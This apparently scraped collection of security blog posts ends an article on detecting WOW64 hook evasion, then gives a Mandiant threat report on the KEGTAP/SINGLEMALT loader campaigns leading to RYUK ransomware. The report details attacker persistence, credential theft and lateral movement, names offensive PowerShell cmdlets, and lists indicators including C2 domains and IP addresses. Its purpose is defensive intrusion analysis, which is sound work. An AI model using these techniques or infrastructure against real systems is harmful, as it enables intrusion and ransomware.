nice C++ function, it’s possible for the wow64log DLL to invoke the callback via a simple C style function pointer call shown in Figure 20. Figure 20: call_function32 invokes shellcode to call a 32-bit callback from the 64-bit logging DLL From within the 32-bit callback any desired MITM operations can be performed, but restrictions exist on which APIs are callable. Due to the context saving that the WOW64 layer performs, 32-bit APIs that would re-enter the WOW64 layer may not be called as the context values would be corrupted. We are therefore limited to only APIs that won’t re-enter WOW64, which are those that are exported from the 64-bit ntdll. The NtWriteFile export may be used to easily write to stdout or a file, but we must re-enter the 64-bit execution mode and do the inverse argument mapping as before. This logging routine can be called from within the 32-bit callbacks and is shown in Figure 21 and Figure 22. Figure 21: call_function64 invokes shellcode to call the 64bit WriteFile from with the 32bit callback Figure 22: 32bit callbacks must log via routines that only call non-reentrant WOW64 APIs The result is clean looking callback stubs that function exactly how inline hooks might, but with zero assembly modifications required. Arguments can easily be manipulated as well, but the return status may not be modified unless a little stack walk hackery is implemented. The only other consideration is that the wow64log DLL itself needs to be carefully crafted to not build with any CRT mechanisms. The flags required are: Disable CRT with /NODEFAULT LIB (all C APIs now unavailable), set a new entry point name to not init CRT NtDllMain Disable all CRT security routines /GS- Disable C++ exceptions Remove default linker libraries, only link ntdll.lib Use extern “C” __declspec(dllimport) <typedef> to link against the correct NtApis An example of a program hooking its own system calls via wow64log inline hooks is shown in Figure 23. Figure 23: Demonstration of inline hooks in action Conclusion Using inline WOW64 hooks, wow64log hooks, and kernel/hypervisor hooks, all techniques of usermode hook evasion can be identified easily and automatically. Detecting which layers of hooks are skipped or bypassed will give insight into which evasion technique is employed. The identifying table is: Evasion Mode 32bit Inline wow64Log 64bit Inline Kernel/Hypervisor Prologue Restore ❌ ✔ ✔ ✔ Heavens Gate sys-stub ❌ ❌ ✔ ✔ Heavens Gate direct syscall ❌ ❌ ❌ ✔ Structure Appendix struct _WOW64_CPURESERVED { USHORT Flags; USHORT MachineType; WOW64_CONTEXT Context; char ContextEx[1024]; }; typedef ULONG *WOW64_LOG_ARGUMENTS; struct _WOW64_SYSTEM_SERVICE { unsigned __int32 SystemCallNumber : 12; unsigned __int32 ServiceTableIndex : 4; unsigned __int32 TurboThunkNumber : 5; unsigned __int32 AlwaysZero : 11; }; #pragma pack(push, 1) struct _WOW64_FLOATING_SAVE_AREA { DWORD ControlWord; DWORD StatusWord; DWORD TagWord; DWORD ErrorOffset; DWORD ErrorSelector; DWORD DataOffset; DWORD DataSelector; BYTE RegisterArea[80]; DWORD Cr0NpxState; }; #pragma pack(pop) #pragma pack(push, 1) struct _WOW64_CONTEXT { DWORD ContextFlags; DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; WOW64_FLOATING_SAVE_AREA FloatSave; DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; DWORD Ebp; DWORD Eip; DWORD SegCs; DWORD EFlags; DWORD Esp; DWORD SegSs; BYTE ExtendedRegistersUnk[160]; M128A Xmm0; M128A Xmm1; M128A Xmm2; M128A Xmm3; M128A Xmm4; M128A Xmm5; M128A Xmm6; M128A Xmm7; M128A Xmm8; M128A Xmm9; M128A Xmm10; M128A Xmm11; M128A Xmm12; M128A Xmm13; M128A Xmm14; M128A Xmm15; }; #pragma pack(pop) Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-10-28",
                    "source": "www.fireeye.com"
                },
                "text": "Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise . Effective and fast detection of these campaigns is key to mitigating this threat . The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9 . The operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis , demonstrating a clear disregard for human life. Email Campaign TTPs Campaigns distributing KEGTAP, SINGLEMALT and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity: Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file. This document contains an in-line link to a URL hosting a malware payload. Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys or queries about business hours. Some email communications have included the recipient’s name or employer name in the subject line and/or email body. Despite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include: Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service. The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns these malware binaries were hosted on compromised infrastructure, however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains. In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links. Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations (Figure 1) and organizations’ logos embedded into the Google Docs documents (Figure 2). Figure 1: Email containing internal references to target an organization’s name Figure 2: Google Docs PDF document containing a target organization’s logo Hiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult. Post-Compromise TTPs Given the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware. Establish Foothold Once the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle. Maintain Presence Beyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot. The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using /setnotifycmdline, and adding itself to the Userinit value under the following registry key: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents. We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor. The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot. In at least once case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication. Escalate Privileges The most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts. The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON. Actors have gained access to credentials via exported copies of the ntds.dit Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller. In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet. Reconnaissance The approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON. BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include: Get-GPPPassword Invoke-AllChecks Invoke-BloodHound Invoke-EternalBlue Invoke-FileFinder Invoke-HostRecon Invoke-Inveigh Invoke-Kerberoast Invoke-LoginPrompt Invoke-mimikittenz Invoke-ShareFinder Invoke-UserHunter Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including ipconfig , findstr , and cmd.exe. The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials. WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture. The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to res.txt . The actors used the Nltest command to list domain controllers. Lateral Movement Lateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP and SMB, or using the same backdoors used to establish a foothold in victim networks. The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments. The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols. The actors used the Windows net use command to connect to Windows admin shares to move laterally. Complete Mission Mandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment. In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server. The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files. The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise. The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis. Hunting Strategies If an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel. Isolate and perform a forensic review of any impacted systems. Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes. Identify the URLs used by the phishing campaign and block them using proxy or network security devices. Reset credentials for any user accounts associated with execution of the malware. Perform an enterprise wide review for lateral movement authentication from the impacted systems. Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc) and move towards multi-factor authentication (MFA) as soon as possible. An enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows. Activity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon registry key. %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders SINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host run the command bitsadmin /list . Display name may be “Adobe Update”, “System autoupdate” or another generic value. Notify state may be set to Fail (Status 2). FileList URL value may be set to the local host or a URL that does not exist. The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it. The Retry Delay value will be set. WINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware. Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr Value: Path to the backdoor Figure 4: Example registry RUN key used by WINEKEY to maintain persistence The ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case. The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: < Random directory within %APPDATA% > autoupdate#< random number >. All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise. Although it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the C:\\Windows\\SysWOW64 directory that have a file name matching the following pattern: < 8 random lowercase chars >.exe. Stacking or sorting on file creation timestamps in the C:\\Windows\\SysWOW64 directory may also help identify malicious files, as the directory should be mostly static. Post-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence. The following are additional strategies that may aid in identifying associated activity: Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration or communication services with a referrer from a Google Docs document. During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share. While collecting data used to enable later-stage operations, the attackers commonly leave instances of ntds.dit and exports of the SYSTEM and SECURITY registry hives on impacted systems. Hardening Strategies The actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper . Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation. Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins.Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor. Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON. Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that do not have a business categorization. Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware. For more intelligence on ransomware and other threats, please register for Mandiant Advantage Free , a no-cost version of our threat intelligence platform. Check out this episode of State of the Hack for additional information on this threat. Campaign Indicators Sample Email Subjects / Patterns <(first|last)-name>: Important Information <Company Name> <Company Name> complaint <(first|last)-name> <(first|last)-name> Agreement cancellation message Agreement cancellation notice Agreement cancellation notification Agreement cancellation reminder Agreement suspension message Agreement suspension notice Agreement suspension notification Agreement suspension reminder Arrangement cancellation message Arrangement cancellation notice Arrangement cancellation notification Arrangement cancellation reminder Arrangement suspension message Arrangement suspension notice Arrangement suspension notification Arrangement suspension reminder Contract cancellation message Contract cancellation notice Contract cancellation notification Contract cancellation reminder Contract suspension message Contract suspension notice Contract suspension notification Contract suspension reminder debit confirmation FW: <Name> Annual Bonus Report is Ready FW: Urgent: <Company Name>: A Customer Complaint Request – Prompt Action Required RE: <(first|last)-name> RE: <(first|last)-name>: Your Payslip for October RE: <Company Name> - my visit RE: <Company Name> Employee Survey RE: <Company Name> office RE: <Name> about complaint RE: <Name> bonus RE: <Name> termination list RE: <Name> RE: <Company Name> office RE: <(first|last)-name> RE: <(first|last)-name> <(first|last)-name>: complaint RE: <(first|last)-name>: Subpoena RE: <(first|last)-name> RE: <(first|last)-name>: Your Payslip for September RE: about complaint RE: Adopted Filer Forms RE: Business hours adjustment RE: Business hours realignment RE: Business hours rearrangement RE: Business hours restructuring RE: Business schedule adjustment RE: Business schedule realignment RE: Business schedule rearrangement RE: Business schedule restructuring RE: call me RE: changes RE: complaint RE: Complaint in <Company Name>. RE: Complaint on <Name> RE: customer request RE: debit confirmation RE: document copy RE: documents list RE: Edgar Filer forms renovations RE: employee bonuses RE: Filer Forms adaptations RE: my call RE: New filer form types RE: office RE: our meeting RE: Payroll Register RE: report confirmation RE: situation RE: Subpoena RE: termination RE: till 2 pm RE: Urgent <Company Name> Employee Internal Survey RE: visit RE: what about your opinion? RE: what time? RE: why RE: why this debit RE: Working schedule adjustment RE: Working schedule realignment RE: Working schedule rearrangement RE: Working schedule restructuring RE: Your Payslip for September Example Malware Family MD5s KEGTAP df00d1192451268c31c1f8568d1ff472 BEERBOT 6c6a2bfa5846fab374b2b97e65095ec9 SINGLEMALT 37aa5690094cb6d638d0f13851be4246 STILLBOT 3176c4a2755ae00f4fffe079608c7b25 WINEKEY 9301564bdd572b0773f105287d8837c4 CORKBOT 0796f1c1ea0a142fc1eb7109a44c86cb Code Signing Certificate CNs ARTBUD RADOM SP Z O O BESPOKE SOFTWARE SOLUTIONS LIMITED Best Fud, OOO BlueMarble GmbH CHOO FSP, LLC Company Megacom SP Z O O ESTELLA, OOO EXON RENTAL SP Z O O Geksan LLC GLOBAL PARK HORIZON SP Z O O Infinite Programming Limited James LTH d.o.o. Logika OOO MADAS d.o.o. MUSTER PLUS SP Z O O NEEDCODE SP Z O O Nordkod LLC NOSOV SP Z O O OOO MEP PLAN CORP PTY LTD REGION TOURISM LLC RESURS-RM OOO Retalit LLC Rumikon LLC SNAB-RESURS, OOO TARAT d.o.o. TES LOGISTIKA d.o.o. VAS CO PTY LTD VB CORPORATE PTY. LTD. VITA-DE d.o.o. UNC1878 Indicators A significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group. BEACON C2s First Seen Domain 12/11/19 updatemanagir[.]us 12/20/19 cmdupdatewin[.]com 12/26/19 scrservallinst[.]info 1/10/20 winsystemupdate[.]com 1/11/20 jomamba[.]best 1/13/20 updatewinlsass[.]com 1/16/20 winsysteminfo[.]com 1/20/20 livecheckpointsrs[.]com 1/21/20 ciscocheckapi[.]com 1/28/20 timesshifts[.]com 1/29/20 cylenceprotect[.]com 1/30/20 sophosdefence[.]com 1/30/20 taskshedulewin[.]com 1/30/20 windefenceinfo[.]com 1/30/20 lsasswininfo[.]com 1/30/20 update-wind[.]com 1/30/20 lsassupdate[.]com 1/30/20 renovatesystem[.]com 1/31/20 updatewinsoftr[.]com 2/2/20 cleardefencewin[.]com 2/2/20 checkwinupdate[.]com 2/2/20 havesetup[.]net 2/3/20 update-wins[.]com 2/3/20 conhostservice[.]com 2/4/20 microsoftupdateswin[.]com 2/4/20 iexploreservice[.]com 2/12/20 avrenew[.]com 2/12/20 target-support[.]online 2/12/20 web-analysis[.]live 2/14/20 freeallsafe[.]com 2/17/20 windefens[.]com 2/17/20 defenswin[.]com 2/17/20 easytus[.]com 2/17/20 greattus[.]com 2/17/20 livetus[.]com 2/17/20 comssite[.]com 2/17/20 findtus[.]com 2/17/20 bigtus[.]com 2/17/20 aaatus[.]com 2/17/20 besttus[.]com 2/17/20 firsttus[.]com 2/17/20 worldtus[.]com 2/26/20 freeoldsafe[.]com 2/26/20 serviceupdates[.]net 2/26/20 topserviceupdater[.]com 2/27/20 myserviceupdater[.]com 2/29/20 myservicebooster[.]net 2/29/20 servicesbooster[.]org 2/29/20 brainschampions[.]com 2/29/20 myservicebooster[.]com 2/29/20 topservicesbooster[.]com 2/29/20 servicesbooster[.]com 2/29/20 topservicesecurity[.]org 2/29/20 topservicesecurity[.]net 2/29/20 topsecurityservice[.]net 2/29/20 myyserviceupdater[.]com 2/29/20 topservicesupdate[.]com 2/29/20 topservicesecurity[.]com 2/29/20 servicesecurity[.]org 2/29/20 myserviceconnect[.]net 3/2/20 topservicesupdates[.]com 3/2/20 yoursuperservice[.]com 3/2/20 topservicehelper[.]com 3/2/20 serviceuphelper[.]com 3/2/20 serviceshelpers[.]com 3/2/20 boostsecuritys[.]com 3/3/20 hakunamatatata[.]com 3/8/20 service-updater[.]com 3/9/20 secondserviceupdater[.]com 3/9/20 twelvethserviceupdater[.]com 3/9/20 twentiethservicehelper[.]com 3/9/20 twelfthservicehelper[.]com 3/9/20 tenthservicehelper[.]com 3/9/20 thirdserviceupdater[.]com 3/9/20 thirdservicehelper[.]com 3/9/20 tenthserviceupdater[.]com 3/9/20 thirteenthservicehelper[.]com 3/9/20 seventeenthservicehelper[.]com 3/9/20 sixteenthservicehelper[.]com 3/9/20 sixthservicehelper[.]com 3/9/20 seventhservicehelper[.]com 3/9/20 seventhserviceupdater[.]com 3/9/20 sixthserviceupdater[.]com 3/9/20 secondservicehelper[.]com 3/9/20 ninthservicehelper[.]com 3/9/20 ninethserviceupdater[.]com 3/9/20 fourteenthservicehelper[.]com 3/9/20 fourthserviceupdater[.]com 3/9/20 firstserviceupdater[.]com 3/9/20 firstservisehelper[.]com 3/9/20 fifthserviceupdater[.]com 3/9/20 eleventhserviceupdater[.]com 3/9/20 fifthservicehelper[.]com 3/9/20 fourservicehelper[.]com 3/9/20 eighthservicehelper[.]com 3/9/20 eighteenthservicehelper[.]com 3/9/20 eighthserviceupdater[.]com 3/9/20 fifteenthservicehelper[.]com 3/9/20 nineteenthservicehelper[.]com 3/9/20 eleventhservicehelper[.]com 3/14/20 thirdservice-developer[.]com 3/14/20 fifthservice-developer[.]com 3/15/20 firstservice-developer[.]com 3/16/20 fourthservice-developer[.]com 3/16/20 ninethservice-developer[.]com 3/16/20 seventhservice-developer[.]com 3/16/20 secondservice-developer[.]com 3/16/20 sixthservice-developer[.]com 3/16/20 tenthservice-developer[.]com 3/16/20 eithtservice-developer[.]com 3/17/20 servicedupdater[.]com 3/17/20 service-updateer[.]com 3/19/20 sexyservicee[.]com 3/19/20 serviceboostnumberone[.]com 3/19/20 servicedbooster[.]com 3/19/20 service-hunter[.]com 3/19/20 servicedhunter[.]com 3/19/20 servicedpower[.]com 3/19/20 sexycservice[.]com 3/23/20 yourserviceupdater[.]com 3/23/20 top-serviceupdater[.]com 3/23/20 top-servicebooster[.]com 3/23/20 serviceshelps[.]com 3/23/20 servicemonsterr[.]com 3/23/20 servicehunterr[.]com 3/23/20 service-helpes[.]com 3/23/20 servicecheckerr[.]com 3/23/20 newservicehelper[.]com 3/23/20 huntersservice[.]com 3/23/20 helpforyourservice[.]com 3/23/20 boostyourservice[.]com 3/26/20 developmasters[.]com 3/26/20 actionshunter[.]com 5/4/20 info-develop[.]com 5/4/20 ayechecker[.]com 5/4/20 service-booster[.]com 9/18/20 zapored[.]com 9/22/20 gtrsqer[.]com 9/22/20 chalengges[.]com 9/22/20 caonimas[.]com 9/22/20 hakunaman[.]com 9/22/20 getinformationss[.]com 9/22/20 nomadfunclub[.]com 9/22/20 harddagger[.]com 9/22/20 errvghu[.]com 9/22/20 reginds[.]com 9/22/20 gameleaderr[.]com 9/22/20 razorses[.]com 9/22/20 vnuret[.]com 9/22/20 regbed[.]com 9/22/20 bouths[.]com 9/23/20 ayiyas[.]com 9/23/20 serviceswork[.]net 9/23/20 moonshardd[.]com 9/23/20 hurrypotter[.]com 9/23/20 biliyilish[.]com 9/23/20 blackhoall[.]com 9/23/20 checkhunterr[.]com 9/23/20 daggerclip[.]com 9/23/20 check4list[.]com 9/24/20 chainnss[.]com 9/29/20 hungrrybaby[.]com 9/30/20 martahzz[.]com 10/1/20 jonsonsbabyy[.]com 10/1/20 wondergodst[.]com 10/1/20 zetrexx[.]com 10/1/20 tiancaii[.]com 10/1/20 cantliee[.]com 10/1/20 realgamess[.]com 10/1/20 maybebaybe[.]com 10/1/20 saynoforbubble[.]com 10/1/20 chekingking[.]com 10/1/20 rapirasa[.]com 10/1/20 raidbossa[.]com 10/1/20 mountasd[.]com 10/1/20 puckhunterrr[.]com 10/1/20 pudgeee[.]com 10/1/20 loockfinderrs[.]com 10/1/20 lindasak[.]com 10/1/20 bithunterr[.]com 10/1/20 voiddas[.]com 10/1/20 sibalsakie[.]com 10/1/20 giveasees[.]com 10/1/20 shabihere[.]com 10/1/20 tarhungangster[.]com 10/1/20 imagodd[.]com 10/1/20 raaidboss[.]com 10/1/20 sunofgodd[.]com 10/1/20 rulemonster[.]com 10/1/20 loxliver[.]com 10/1/20 servicegungster[.]com 10/1/20 kungfupandasa[.]com 10/2/20 check1domains[.]com 10/5/20 sweetmonsterr[.]com 10/5/20 qascker[.]com 10/7/20 remotessa[.]com 10/7/20 cheapshhot[.]com 10/7/20 havemosts[.]com 10/7/20 unlockwsa[.]com 10/7/20 sobcase[.]com 10/7/20 zhameharden[.]com 10/7/20 mixunderax[.]com 10/7/20 bugsbunnyy[.]com 10/7/20 fastbloodhunter[.]com 10/7/20 serviceboosterr[.]com 10/7/20 servicewikii[.]com 10/7/20 secondlivve[.]com 10/7/20 quwasd[.]com 10/7/20 luckyhunterrs[.]com 10/7/20 wodemayaa[.]com 10/7/20 hybriqdjs[.]com 10/7/20 gunsdrag[.]com 10/7/20 gungameon[.]com 10/7/20 servicemount[.]com 10/7/20 servicesupdater[.]com 10/7/20 service-boosterr[.]com 10/7/20 serviceupdatter[.]com 10/7/20 dotmaingame[.]com 10/12/20 backup1service[.]com 10/13/20 bakcup-monster[.]com 10/13/20 bakcup-checker[.]com 10/13/20 backup-simple[.]com 10/13/20 backup-leader[.]com 10/13/20 backup-helper[.]com 10/13/20 service-checker[.]com 10/13/20 nasmastrservice[.]com 10/14/20 service-leader[.]com 10/14/20 nas-simple-helper[.]com 10/14/20 nas-leader[.]com 10/14/20 boost-servicess[.]com 10/14/20 elephantdrrive[.]com 10/15/20 service-hellper[.]com 10/16/20 top-backuphelper[.]com 10/16/20 best-nas[.]com 10/16/20 top-backupservice[.]com 10/16/20 bestservicehelper[.]com 10/16/20 backupnas1[.]com 10/16/20 backupmastter[.]com 10/16/20 best-backup[.]com 10/17/20 viewdrivers[.]com 10/19/20 topservicebooster[.]com 10/19/20 topservice-masters[.]com 10/19/20 topbackupintheworld[.]com 10/19/20 topbackup-helper[.]com 10/19/20 simple-backupbooster[.]com 10/19/20 top3-services[.]com 10/19/20 backup1services[.]com 10/21/20 backupmaster-service[.]com 10/21/20 backupmasterservice[.]com 10/21/20 service1updater[.]com 10/21/20 driverdwl[.]com 10/21/20 backup1master[.]com 10/21/20 boost-yourservice[.]com 10/21/20 checktodrivers[.]com 10/21/20 backup1helper[.]com 10/21/20 driver1updater[.]com 10/21/20 driver1master[.]com 10/23/20 view-backup[.]com 10/23/20 top3servicebooster[.]com 10/23/20 servicereader[.]com 10/23/20 servicehel[.]com 10/23/20 driver-boosters[.]com 10/23/20 service1update[.]com 10/23/20 service-hel[.]com 10/23/20 driver1downloads[.]com 10/23/20 service1view[.]com 10/23/20 backups1helper[.]com 10/25/20 idriveview[.]com 10/26/20 debug-service[.]com 10/26/20 idrivedwn[.]com 10/28/20 driverjumper[.]com 10/28/20 service1boost[.]com 10/28/20 idriveupdate[.]com 10/28/20 idrivehepler[.]com 10/28/20 idrivefinder[.]com 10/28/20 idrivecheck[.]com 10/28/20 idrivedownload[.]com First Seen Server Subject MD5 12/12/19 140.82.60.155:443 CN=updatemanagir[.]us ec16be328c09473d5e5c07310583d85a 12/21/19 96.30.192.141:443 CN=cmdupdatewin[.]com 3d4de17df25412bb714fda069f6eb27e 1/6/20 45.76.49.78:443 CN=scrservallinst[.]info cd6035bd51a44b597c1e181576dd44d9 1/8/20 149.248.58.11:443 CN=updatewinlsass[.]com 8c581979bd11138ffa3a25b895b97cc0 1/9/20 96.30.193.57:443 CN=winsystemupdate[.]com e4e732502b9658ea3380847c60b9e0fe 1/14/20 95.179.219.169:443 CN=jomamba[.]best 80b7001e5a6e4bd6ec79515769b91c8b 1/16/20 140.82.27.146:443 CN=winsysteminfo[.]com 29e656ba9d5d38a0c17a4f0dd855b37e 1/19/20 45.32.170.9:443 CN=livecheckpointsrs[.]com 1de9e9aa8363751c8a71c43255557a97 1/20/20 207.148.8.61:443 CN=ciscocheckapi[.]com 97ca76ee9f02cfda2e8e9729f69bc208 1/28/20 209.222.108.106:443 CN=timesshifts[.]com 2bb464585f42180bddccb50c4a4208a5 1/29/20 31.7.59.141:443 CN=updatewinsoftr[.]com 07f9f766163c344b0522e4e917035fe1 1/29/20 79.124.60.117:443 C=US 9722acc9740d831317dd8c1f20d8cfbe 1/29/20 66.42.86.61:443 CN=lsassupdate[.]com 3c9b3f1e12473a0fd28dc37071168870 1/29/20 45.76.20.140:443 CN=cylenceprotect[.]com da6ce63f4a52244c3dced32f7164038a 1/29/20 45.76.20.140:80 CN=cylenceprotect[.]com da6ce63f4a52244c3dced32f7164038a 1/30/20 149.248.5.240:443 CN=sophosdefence[.]com 